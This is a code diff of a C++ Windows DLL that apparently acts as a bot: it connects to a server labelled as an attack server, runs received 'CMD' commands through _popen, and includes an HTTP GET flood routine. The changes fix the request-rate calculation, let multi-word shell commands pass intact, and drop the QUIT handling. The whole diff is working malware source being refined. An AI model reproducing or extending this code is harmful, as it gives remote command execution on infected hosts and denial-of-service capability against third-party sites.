@@ -29,7 +29,7 @@
 
 // Mutex name for synchronizing access to the flag file
 const wchar_t* mutexName = L"DC2DLLMutex";
-const char inputParamsSeparator = '|';
+const char inputParamsSeparator = ' ';
 const int ATK_SRV_PORT = 5000;
 const char* ATK_SRV_ADDR = "127.0.0.1";
 
@@ -56,7 +56,7 @@ void showMessageInDLL(const std::string& message) {
 
 void PerformHttpGetRequest(const std::string& url, int requestsPerMinute, int numberOfMinutes) {
     std::string result;
-    int delayBetweenRequests = 60/requestsPerMinute * 1000;
+    int delayBetweenRequests = 60/float(requestsPerMinute) * 1000;
     int totalRequestCount = requestsPerMinute * numberOfMinutes;
     HINTERNET hInternet = InternetOpen(L"HTTPGETREQUEST", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (hInternet) {
@@ -142,7 +142,16 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
         }
         else if (action == "CMD") {
             // PARAMETER: COMMAND
-            std::string cmd = params[1];
+
+            std::string cmd = "";
+
+            for (std::size_t i = 1; i < params.size(); ++i) {
+                cmd += params[i];  // Concatenate the current string
+                if (i < params.size() - 1) {
+                    cmd += inputParamsSeparator;
+                }
+            }
+
             FILE* commandOutput = _popen(cmd.c_str(), "r");
             if (commandOutput == nullptr) {
                 std::cerr << "Failed to execute command." << std::endl;
@@ -168,10 +177,6 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
         }
 
         //showMessageInDLL(params[0]);
-
-        if (strcmp(command, "QUIT") == 0) { // dovrebbe esserci?
-            break;
-        }
 
         if (command == nullptr || strnlen(command, 1024) == 0) { //dovrebbe esserci?
             std::cerr << "No command." << std::endl;
